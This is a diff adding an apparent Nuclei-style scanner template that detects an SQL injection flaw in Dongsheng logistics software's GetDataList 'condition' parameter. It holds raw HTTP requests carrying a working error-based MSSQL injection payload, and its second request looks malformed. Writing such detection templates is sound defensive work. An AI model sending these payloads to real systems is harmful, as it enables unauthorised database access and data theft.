@@ -1,0 +1,38 @@
+id: dongsheng-logistics-sqli
+info:
+  name: Dongsheng Logistics Software SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Dongsheng logistics software /TruckMng/MsWlDriver/GetDataList file condition parameter SQL injection vulnerability allows attackers to leverage SQL injection to obtain sensitive data or achieve remote system access.
+  reference:
+    - http://www.dongshengsoft.com
+
+http:
+  - raw:
+      - |
+        GET /TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort=&condition=DrvCode%20like%20'%25'%20and%20DrvName%20like%20'%25'%20and%20JzNo%20like%20'%25'%20and%20OrgCode%20like%20'%25'%20AND%204045%20IN%20(select%20sys.fn_sqlvarbasetostr(hashbytes('MD5','5')))--%20IkbK&page=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "e4da3b7fbbce2345d7772b0674a318d5"
+
+  - raw:
+      - |
+        GET /TruckMng/MsWlDriver/GetDataList?_dc=1665626804091&start=0&limit=30&sort=&condition=DrvCode+like+'%251%25'+and+DrvName+like+'%251%25'+and+JzNo+like+'%251%25'+and+OrgCode+like+'%251%25'+AND+4045+IN+(select+nvarchar)%20IkbK&page=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "nvarchar"
